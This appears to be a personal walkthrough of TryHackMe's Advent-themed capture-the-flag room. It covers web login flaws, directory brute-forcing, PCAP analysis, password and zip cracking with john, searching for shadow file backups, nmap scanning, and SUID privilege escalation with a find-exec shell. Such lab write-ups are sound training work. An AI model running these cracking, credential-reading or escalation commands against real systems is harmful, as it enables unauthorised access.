# Room
https://tryhackme.com/room/25daysofchristmas

# Task 1 - Intro
Intro

# Task 2 - Connect
Connect

# Task 3 - Points
Points

# Task 4 - Social
Social

# Task 5 - Kali Machine
Kali Machine

# Task 6 - Day 1
Presented with a web app and asked to login as mcinventory
* Noticed register option in web app, clicked register, registered a new user called mcinventory.  This web app is vulnerable to re-registration
* After registering, logged in as mcinventory with a password I created at registration
* Question 1 - cookie name
    * Loaded developer tools for my browser and went to Storage > Cookies and grabbed the name of the cookie
* Question 2 - decode the cookie
    * Copy cookie value and decode with the following
        ```
        echo "found_cookie" | base64 -d
        ```
* Question 3 - mcinventory's request
    * After logging in with mcinventory you can see the inventory item he requested

# Task 7 - Day 2
Discover the forum and login
* Question 1 - find hidden directory
    * Used gobuster
        ```
        gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.53.247:3000 -t 50 -x php,txt,html                               
        ===============================================================                                                                                                                            
        Gobuster v3.0.1                                                                                                                                                                            
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                                                            
        ===============================================================                                                                                                                            
        [+] Url:            http://10.10.53.247:3000                                                                                                                                               
        [+] Threads:        50                                                                                                                                                                     
        [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                           
        [+] Status codes:   200,204,301,302,307,401,403                                                                                                                                            
        [+] User Agent:     gobuster/3.0.1                                                                                                                                                         
        [+] Extensions:     php,txt,html                                                                                                                                                           
        [+] Timeout:        10s                                                                                                                                                                    
        ===============================================================                                                                                                                            
        2021/02/14 12:45:20 Starting gobuster                                                        
        ===============================================================    
        ```
* Question 2 - find the password
    * After finding the hidden directory I browsed to it and looked at the HTML source code.  In it was a comment about the author and repo where the page was based.  Pulling the repo up and the author provided a default username/password to allow us to connect
* Question 3 - what to take to the partay
    * Once you login with the default creds, there is mention of what you need to bring

# Task 8 - Day 3
A PCAP file is provided and you are asked to do some analysis on it
* Question 1 - find dst IP of packet 998
    * Open PCAP in wireshark and look for dst IP of packet 998
        ```
        frame.number == 998
        ```
* Question 2 - find Christmas list
    * Use the destination address you found in #1 as a filter
        ```
        ip.dst == [ip address]
        ```
* Question 3 - crack the password
    * Filter based on telnet to grab data
        ```
        telnet
        ```
    * Select telnet payload, right click > export packet bytes
    * Take payload data and crack
        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt shadow 

        Using default input encoding: UTF-8
        Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
        Cost 1 (iteration count) is 5000 for all loaded hashes
        Will run 2 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        [removed]          (buddy)
        1g 0:00:00:00 DONE (2021-02-14 15:05) 7.142g/s 1828p/s 1828c/s 1828C/s 123456..freedom
        Use the "--show" option to display all of the cracked passwords reliably
        Session completed
        ```

# Task 9 - Day 4
Linux navigation

* Question 1 - list files in a directory
    * ls -l
* Question 2 - display the contents of a file
    * cat file
* Question 3 - which file contains a string
    * grep [pattern] file*
* Question 4 - which file contains an IP address
    * egrep '([0-9]{1,3}\.[0-9]{1,3})' file*
* Question 5 - how many users can login to this machine
    * cat /etc/passwd | grep bash | wc -l
* Question 6 - what is the SHA1 hash of a file
    * cat file | sha1sum
* Question 7 - what is a user's password hash
    * look for shadow file backups
    * find / -name shadow* -type f 2>/dev/null

# Task 10 - Day 5
OSINT

Given an image use OSINT techniques to answer the questions.  Answers started with using exiftool to grab a username.  Search for that username on google to find social media.  Inside social media were links to other items of interest.  Also used Wayback Machine

# Task 11 - Day 6
Another PCAP is provided for analysis

* Question 1 - what was exfiltrated in DNS
    * set wireshark filter to dns
    * load CyberChef and paste finding
    * use Magic recipe
* Question 2 - Timmy's christmas
    * download the zip file from the PCAP
    * use zip2john to create a hash of the zip file
        ```
        zip2john christmaslists.zip > zip.hash
        ```
    * use john to crack the hash and then extract the contents
        ```
        john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
        ```
* Question 3 - hidden contents
    * download the JPG from the PCAP
    * use steghide to extract the hidden file
        ```
        steghide extract -sf TryHackMe.jpg
        ```

# Task 12 - Day 7
Enumerate the machine
* Question 1 - how many TCP ports under 1000 are open
    ```
    nmap -A -T4 10.10.93.9 -p 1-999 | tee nmap.txt
    ```
* Question 2 - what is the name of the OS on the host
    ```
    guess based on services running
    ```
* Question 3 - what version of SSH is running
    ```
    view nmap results
    ```
* Question 4 - location of hidden file
    * browse to main site, file is listed

# Task 13 - Day 8
SUID exploits
* Question 1 - find SSH port
    * run nmap
        ```
        nmap -A -T4 10.10.114.197 -p- | tee nmap.txt 
        ```
* Question 2 - search for files with SUID bit
    * search for files with SUID set
        ```
        find / -perm -u=s -type f 2>/dev/null
        ```
    * research findings against GTFOBins
    * notice one that stands out and run it
        ```
        holly@ip-10-10-114-197:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
        $ whoami
        igor
        $ cat /home/igor/flag1.txt
        ```
* Question 3 - find another file with SUID set and get root
    * review findings again
    * execute one of the files that looks different
        ```
        /usr/bin/system-control
        ```

# Task 14 - Day 9
Python

Create a script that assembles a flag based on changing directories and JSON responses.  The starting directory is /f, and the example JSON response is {"value":"s","next":"f"}.  Where "value" is a character in the flag and "next" is the next directory you need to GET.  Repeat the process until you encounter "end" in the "next" value, at which you'll have all the characters for the flag to solve the challenge
```
#!/usr/bin/python3

import requests
import time

url = "http://10.10.169.100:3000"

next_req = "f"
flag = ""

def get_url(url, next_req):
    current_url = url + "/" + next_req
    r = requests.get(current_url)
    print(current_url, r.status_code, r.json()['next'], r.json()['value'])
    flag_char = r.json()['value']
    next_req = r.json()['next']
    return [flag_char, next_req]

while next_req != "end":
    request_data = get_url(url, next_req)
    next_req = request_data[1]
    if next_req == "end":
        print("Reached the end")
        break
    flag += request_data[0]
    time.sleep(.001)

print("Your flag is {}".format(flag))
```